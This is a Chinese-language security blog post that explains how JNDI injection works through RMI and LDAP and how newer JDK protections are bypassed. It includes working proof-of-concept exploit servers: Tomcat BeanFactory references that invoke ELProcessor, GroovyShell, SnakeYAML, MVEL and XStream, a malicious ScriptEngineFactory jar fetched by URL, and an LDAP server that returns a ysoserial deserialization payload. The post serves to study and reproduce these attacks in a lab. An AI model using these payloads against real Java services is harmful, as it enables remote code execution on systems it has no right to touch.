---
title: JNDI 注入原理及高版本绕过
published: 2026-10-11
description: JNDI 注入原理,以及 JDK 高版本下的绕过方式
tags: [Java安全, JNDI, RCE]
category: 笔记
draft: false
---

# JNDI 注入原理及高版本绕过

## 一、JNDI 是什么

JNDI 全名是 **Java Naming and Directory Interface**,Java 命名和目录接口,是用同一套代码去访问各种命名目录服务,比如**RMI,DNS,LDAP**

代码调用的核心类是 `InitialContext`,核心方法是 `lookup`,用来根据名字查找对象。

根据这个作用我们其实就可以想到,在查找对象调用对象的过程中就可能出现一些类加载的问题

## 二、JNDI 在 RMI 下的注入

rmi 的注入点主要是**两方面**

**其一是调用 lookup(bind 同理)的时候**

```
public Object lookup(String name) throws NamingException {
    return getURLOrDefaultInitCtx(name).lookup(name);
}
```

![image-20260910235702785](/Levi38_blog/images/jndi/image-20260910235702785.png)

![image-20260910234006559](/Levi38_blog/images/jndi/image-20260910234006559.png)

所以 rmi 存在的漏洞这里也都能使用

**其二是 JNDI 存在一个引用对象 Reference**

我们可以传入想要远程加载的类名及其地址

在本地存储 class 的文件夹 7777 端口起一个 web 服务

JNDIRMIServer 在 rebind 的时候会把这个类通过 encode 方法变成 ReferenceWrapper

![image-20260911001227374](/Levi38_blog/images/jndi/image-20260911001227374.png)

![image-20260911001851300](/Levi38_blog/images/jndi/image-20260911001851300.png)

跟进 JNDIRMIClient 的代码

因为 `ReferenceWrapper` 实现了 `RemoteReference` 接口,所以在 decodedObject 的时候通过了校验

![image-20260911001157958](/Levi38_blog/images/jndi/image-20260911001157958.png)

最终可以追溯到执行了 loadClass 并且执行了 newInstance,这一步过后就成功弹出计算器

![image-20260911003344589](/Levi38_blog/images/jndi/image-20260911003344589.png)

![image-20260911003516611](/Levi38_blog/images/jndi/image-20260911003516611.png)

![image-20260911003540431](/Levi38_blog/images/jndi/image-20260911003540431.png)

而这一种也就是我们经常说的**jndi 注入**,当我们看到 InitialContext initialContext = new InitialContext() 以及 initialContext.lookup

## 三、JNDI 注入的 LDAP 绕过

在出现 **rmi** 的 jndi 注入后,jdk 对其进行了修复,但是并不完全,对于 ldap 这种协议就忽略了,所以我们完全可以利用 ldap 服务绑定一个恶意类,然后 jndi 注入

和 rmi 不同,这次我们不再手动搭建 ldap 服务,直接用 yakit 一键搭建一个 ldap 服务器,并且绑定好恶意类

![image-20260912172217682](/Levi38_blog/images/jndi/image-20260912172217682.png)

![image-20260912172240859](/Levi38_blog/images/jndi/image-20260912172240859.png)

我们跟进去看一下具体是怎么触发的

一路调试看到关键执行是在这里

进入了 DirectoryManager.getObjectInstance 后

![image-20260912172916171](/Levi38_blog/images/jndi/image-20260912172916171.png)

触发 getObjectFactoryFromReference,后面的代码也就和之前 RMI 的时候一样了

![image-20260912172953423](/Levi38_blog/images/jndi/image-20260912172953423.png)

最终加载恶意类执行代码

![image-20260912174020738](/Levi38_blog/images/jndi/image-20260912174020738.png)

![image-20260912174106123](/Levi38_blog/images/jndi/image-20260912174106123.png)

而这个漏洞直到 jdk8u191 才被修复

## 四、JNDI 高版本注入

### 漏洞修复

之前说到过 jdk8u191 之后**ldap 的 jndi 注入**就被修复了,我们把 jdk 版本换到 8u251,再用同样的方式尝试执行命令就失败了

![image-20260912184928937](/Levi38_blog/images/jndi/image-20260912184928937.png)

所以我们先来看一下具体是如何修复的

主要就是在最终加载类的时候有一个判断,很明显现在默认设置是 false 的,所以无法加载远程类,也没有抛出异常,代码也就没能执行

![image-20260912185945587](/Levi38_blog/images/jndi/image-20260912185945587.png)

### 绕过原理

既然阻止了远程恶意类的调用,我们自然就无法通过远程的 ldap 服务加载恶意类

但是如果本地的**工厂类**存在问题,就不需要走到远程调用的步骤,直接绕过并加载恶意类

![image-20260914105900897](/Levi38_blog/images/jndi/image-20260914105900897.png)

### 常见绕过方式

目前来说最常见的绕过方式有几种:

* 通过 Tomcat 的 `org.apache.naming.factory.BeanFactory` 工厂类去调用 `javax.el.ELProcessor#eval` 方法或 `groovy.lang.GroovyShell#evaluate` 方法
* 通过 LDAP 的 `javaSerializedData` 反序列化 gadget

这里我们来依次进行总结复现

####  BeanFactory 调用 ELProcessor 的 eval

在 tomcat 中有一个 BeanFactory 类,实现了 ObjectFactory 接口,而在 BeanFactory 重写的 getObjectInstance 方法中,出现了反射调用,如果我们能控制 method,bean,valueArray 的值,那是不是就可以执行恶意方法

![image-20260914114931351](/Levi38_blog/images/jndi/image-20260914114931351.png)

![image-20260914115028376](/Levi38_blog/images/jndi/image-20260914115028376.png)

根据 beanFactory 的代码逻辑,要求传入的 Reference 为 ResourceRef 类,并且 beanClass 必须有无参构造方法,否则反射时会报错

![image-20260914120214030](/Levi38_blog/images/jndi/image-20260914120214030.png)

![image-20260914120326710](/Levi38_blog/images/jndi/image-20260914120326710.png)

forceString 是 BeanFactory 的特殊配置

这里将他取出后进行了判断

**forceString 的格式大致如下**

**<Resource ... forceString="cmd,exec=ABCD" />**

以逗号分隔属性,没有等号时会自动分配 setter,有等号时按照等号后的名字处理

比如上面的例子中 cmd 的 setter 为 setCmd,而 exec 的 setter 却为 ABCD

解析完成后,放到 forced Map 中,参数只能为一个 String 类型的参数

```
RefAddr ra = ref.get("forceString");
Map<String, Method> forced = new HashMap<>();
String value;

if (ra != null) {
    value = (String)ra.getContent();
    Class<?> paramTypes[] = new Class[1];
    paramTypes[0] = String.class;
    String setterName;
    int index;

    /* Items are given as comma separated list */
    for (String param: value.split(",")) {
        param = param.trim();
        /* A single item can either be of the form name=method
         * or just a property name (and we will use a standard
         * setter) */
        index = param.indexOf('=');
        if (index >= 0) {
            setterName = param.substring(index + 1).trim();
            param = param.substring(0, index).trim();
        } else {
            setterName = "set" +
                         param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                         param.substring(1);
        }
        try {
            forced.put(param,
                       beanClass.getMethod(setterName, paramTypes));
        } catch (NoSuchMethodException|SecurityException ex) {
            throw new NamingException
                ("Forced String setter " + setterName +
                 " not found for property " + param);
        }
    }
}
```

所以我们完全可以传入一个拥有 String 参数恶意方法的类,并且在 forceString 中把一个参数的 setter 改为这个方法

就可以执行恶意代码了

首先配置环境,我们需要 Tomcat8 的环境,所以配置一个 springboot 环境,版本指定为 tomcat8,不需要跑起来,因为我们只是要用到里面的依赖。

随后起一个 RMI 服务

![image-20260914142300267](/Levi38_blog/images/jndi/image-20260914142300267.png)

然后把 org.apache.naming.factory.BeanFactory 作为工厂类传入

```
package org.example;

import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;

public class JNDIRMIServerBypass {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString","x=eval"));
        ref.add(new StringRefAddr("x","Runtime.getRuntime().exec('calc')"));
        initialContext.rebind("rmi://localhost:1099/remoteObj",ref);
    }
}
```

这里指定了对象工厂类为 org.apache.naming.factory.BeanFactory

当客户端 `lookup` 拿到这个 ResourceRef 的时候,JNDI 会加载这个工厂类,由它负责实例化上面指定的 ELProcessor

在 forceString 中将 x 的 setter 定义为 eval,那么最终就会反射调用 ELProcessor 的 eval 方法,执行 Runtime

跟进客户端调试最终成功执行命令

![image-20260914144320387](/Levi38_blog/images/jndi/image-20260914144320387.png)

![image-20260914144236149](/Levi38_blog/images/jndi/image-20260914144236149.png)

#### BeanFactory 调用 GroovyShell 的 evaluate

换成 groovy.lang.GroovyShell 的 evaluate 方法也是一样,只是需要客户端具有 groovy 依赖

```
package org.example;

import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;

public class JNDIRMIServerBypass2 {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString","x=evaluate"));
        ref.add(new StringRefAddr("x","\"calc\".execute()"));
        initialContext.rebind("rmi://localhost:1099/remoteObj",ref);
    }
}
```

#### BeanFactory 调用 YAML 的 load

首先创建一个恶意类,实现 ScriptEngineFactory 接口

EvilScriptEngineFactory.java

```
import javax.script.*;
import java.io.IOException;
import java.util.List;

public class EvilScriptEngineFactory implements ScriptEngineFactory {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public String getEngineName() { return null; }
    public String getEngineVersion() { return null; }
    public String getLanguageName() { return null; }
    public String getLanguageVersion() { return null; }
    public List<String> getExtensions() { return null; }
    public List<String> getMimeTypes() { return null; }
    public List<String> getNames() { return null; }
    public Object getParameter(String key) { return null; }
    public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    public String getOutputStatement(String toDisplay) { return null; }
    public String getProgram(String... statements) { return null; }
    public ScriptEngine getScriptEngine() { return null; }
}
```

在 resources 目录下创建 META-INF/services/javax.script.ScriptEngineFactory 文件,里面的内容设置为前面的恶意类名

```
EvilScriptEngineFactory
```

打包编译

```
javac EvilScriptEngineFactory.java
New-Item -ItemType Directory -Force META-INF\services | Out-Null
Set-Content META-INF\services\javax.script.ScriptEngineFactory "EvilScriptEngineFactory"
jar cvf exp.jar EvilScriptEngineFactory.class META-INF
```

服务端起一个 RMI 服务

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = tomcat_snakeyaml();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("remoteObj", wrapper);
        System.out.println("RMI registry ready on 1099");
    }

    private static ResourceRef tomcat_snakeyaml() {
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
```

受害者端必须有 snakeyaml 依赖和 tomcat8

```
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.30</version>
</dependency>
```

#### BeanFactory 调用 mvel 的 exec

```
<dependency>
    <groupId>org.mvel</groupId>
    <artifactId>mvel2</artifactId>
    <version>2.4.12.Final</version>
</dependency>
```

```
public class mvel2ShellSessionServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a", "push Runtime.getRuntime().exec('calc');"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("mvel", referenceWrapper);
    }
}
```

#### BeanFactory 调用 XStream 反序列化

要求 XStream 版本小于 1.4.7

测试版本:1.4.5

起一个 RMI 服务

```
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServerBypass3 {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<sorted-set>" +
                "  <string>foo</string>" +
                "  <dynamic-proxy>" +
                "    <interface>java.lang.Comparable</interface>" +
                "    <handler class=\"java.beans.EventHandler\">" +
                "      <target class=\"java.lang.ProcessBuilder\">" +
                "        <command>" +
                "          <string>calc</string>" +
                "        </command>" +
                "      </target>" +
                "      <action>start</action>" +
                "    </handler>" +
                "  </dynamic-proxy>" +
                "</sorted-set>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));

        registry.bind("remoteObj", new ReferenceWrapper(ref));
        System.out.println("RMI exploit server ready on 1099");
    }
}
```

![image-20260915224931286](/Levi38_blog/images/jndi/image-20260915224931286.png)

#### 利用 LDAP 返回序列化数据,触发本地 Gadget

当环境中有 cc 依赖时,并且 JDK 版本符合条件可以触发

![image-20260914195905243](/Levi38_blog/images/jndi/image-20260914195905243.png)

起一个 ldap 服务,用 ysoserial 生成 cc6(不依赖 jdk 版本)

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Entry;

import java.nio.file.Files;
import java.nio.file.Paths;

public class LDAPBypassServer {
    public static void main(String[] args) throws Exception {
        String baseDN = "dc=test,dc=com";
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(baseDN);
        config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("LDAP",1389));
        config.setSchema(null);
        config.setEnforceAttributeSyntaxCompliance(false);
        config.setEnforceSingleStructuralObjectClass(false);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        ds.startListening();
        System.out.println("LDAP server started on 1389");

        byte[] payload = Files.readAllBytes(Paths.get("D:/ctf/笔记/web/java/Java-sec/cc6.bin"));

        // ========== 新增:创建父节点 ==========
        Entry baseEntry = new Entry("dc=test,dc=com");
        baseEntry.addAttribute("objectClass", "top", "domain");
        baseEntry.addAttribute("dc", "test");

        Entry payloadEntry = new Entry("dc=payload,dc=test,dc=com");
        payloadEntry.addAttribute("objectClass", "javaNamingReference");
        payloadEntry.addAttribute("javaClassName", "java.lang.Object");
        payloadEntry.addAttribute("javaSerializedData", payload);

        // 批量添加
        ds.addEntries(baseEntry, payloadEntry);
        System.out.println("Payload entry added: ldap://127.0.0.1:1389/dc=payload,dc=test,dc=com");
        System.in.read();
    }
}
```

![image-20260915002944034](/Levi38_blog/images/jndi/image-20260915002944034.png)

我们先调试看一下漏洞是怎么触发的 再解释代码是怎样写出的

前面还是 lookup 走到 c_lookup 时 会判断这条 LDAP 条目身上是否带有 `javaClassName` 属性

![image-20260915205243414](/Levi38_blog/images/jndi/image-20260915205243414.png)

如果具有则会进入 decodeObject 分支

![image-20260915205534379](/Levi38_blog/images/jndi/image-20260915205534379.png)

当检测到存在序列化数据时会进行反序列化操作 最终执行 readObject 方法从而执行任意代码

![image-20260915210119182](/Levi38_blog/images/jndi/image-20260915210119182.png)

![image-20260915211958683](/Levi38_blog/images/jndi/image-20260915211958683.png)

所以这也解释了我们创建 ldap 服务的时候为什么要

```
 payloadEntry.addAttribute("javaClassName", "java.lang.Object");
 payloadEntry.addAttribute("javaSerializedData", payload);
```

第一行是为了通过是否存在 "javaClassName" 这个属性的检验

第二行是为了触发反序列化漏洞

##### 4.3.6.1 实战利用

在碰到有类似依赖的比如 cc 的环境,并且存在我们可以调用的 ldap 服务,那么就可以直接用 yakit 搭建一个 ldap 服务并且使用恶意链来执行命令

![image-20260915213230709](/Levi38_blog/images/jndi/image-20260915213230709.png)



## 参考文章

[从文档开始的jndi注入之路-3 高版本绕过之三打jndi_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ct4y1h79t/?spm_id_from=333.788.videopod.sections&vd_source=71b5899cb0df1e5ef5f681dfd669167a)

[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://alter1125.github.io/file/JNDI注入详细分析/探索高版本 JDK 下 JNDI 漏洞的利用方法/探索高版本JDK下 JNDI 漏洞的利用方法)

[如何绕过高版本 JDK 的限制进行 JNDI 注入利用 - Paper](https://paper.seebug.org/942)
